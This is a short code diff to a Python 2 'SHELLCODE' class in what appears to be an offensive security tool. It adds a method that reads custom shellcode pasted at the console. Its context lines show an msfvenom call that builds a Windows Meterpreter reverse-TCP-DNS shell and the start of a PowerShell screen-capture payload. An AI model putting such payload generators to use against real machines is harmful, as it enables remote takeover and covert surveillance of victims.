@@ -129,6 +129,18 @@ class SHELLCODE(object):
     def windows_met_rev_shell_dns(ip, port):
         return msfvenomGeneration('windows/meterpreter/reverse_tcp_dns', ip, port)
 
+    @staticmethod
+    def windows_custom_shellcode():
+        customshell = ''
+        print 'Paste custom shellcode below\nType \'END\' when done.'
+        while True:
+            buildstr = raw_input().rstrip()
+            if buildstr == 'END':
+                break
+            else:
+                customshell += buildstr
+        return customshell
+
 
     windows_ps_rev_watch_screen = (
         "Try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
